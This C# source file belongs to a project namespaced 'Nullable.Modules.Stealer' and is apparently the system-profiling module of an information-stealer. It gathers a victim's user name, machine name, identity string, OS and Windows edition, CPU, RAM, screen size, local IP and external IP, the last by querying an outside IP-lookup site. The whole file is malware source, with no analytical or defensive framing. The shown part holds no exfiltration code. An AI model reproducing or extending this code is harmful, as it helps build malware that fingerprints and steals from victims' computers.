using Microsoft.Win32;
using System;
using System.Net;
using System.Linq;
using System.Drawing;
using System.Management;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Globalization;
using System.Security.Principal;

namespace Nullable.Modules.Stealer
{
    internal sealed class System
    {
        public static string User = Environment.UserName;
        public static string Computer_Name = Environment.MachineName;
        public static string Language = CultureInfo.CurrentCulture.ToString();
        public static string CurrentData = DateTime.Now.ToString();
        public static string HWID = WindowsIdentity.GetCurrent().ToString();
        public static string OsVersion = Environment.OSVersion.Platform.ToString();
        public static string External_Ip = new WebClient().DownloadString("https://wtfismyip.com/text");
        public static string ScreenMetrics()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            int width = bounds.Width;
            int height = bounds.Height;
            return width + "x" + height;
        }
        public static string GetLocalIP()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                        return ip.ToString();
            }
            catch { }
            return "No network adapters with an IPv4 address in the system!";
        }

        public static string GetWindowsVersionName()
        {
            string sData = "Unknown System";
            try
            {
                using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem"))
                {
                    foreach (ManagementObject tObj in mSearcher.Get())
                        sData = Convert.ToString(tObj["Name"]);
                    sData = sData.Split(new char[] { '|' })[0];
                    int iLen = sData.Split(new char[] { ' ' })[0].Length;
                    sData = sData.Substring(iLen).TrimStart().TrimEnd();
                }
            }
            catch
            {
            }
            return sData;
        }

        public static string GetBitVersion()
        {
            try
            {
                if (Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0")
                    .GetValue("Identifier")
                    .ToString()
                    .Contains("x86"))
                    return "(32 Bit)";
                else
                    return "(64 Bit)";
            }
            catch { }
            return "(Unknown)";
        }

        public static string GetCPUName()
        {
            try
            {
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                foreach (ManagementObject mObject in mSearcher.Get())
                    return mObject["Name"].ToString();
            }
            catch { }
            return "Unknown";
        }

        public static string GetRamAmount()
        {
            try
            {
                int RamAmount = 0;
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    foreach (ManagementObject MO in MOS.Get())
                    {
                        double Bytes = Convert.ToDouble(MO["TotalPhysicalMemory"]);
                        RamAmount = (int)(Bytes / 1048576);
                        break;
                    }
                }
                return RamAmount.ToString() + "MB";
            }
            catch { }
            return "-1";
        }
    }
}
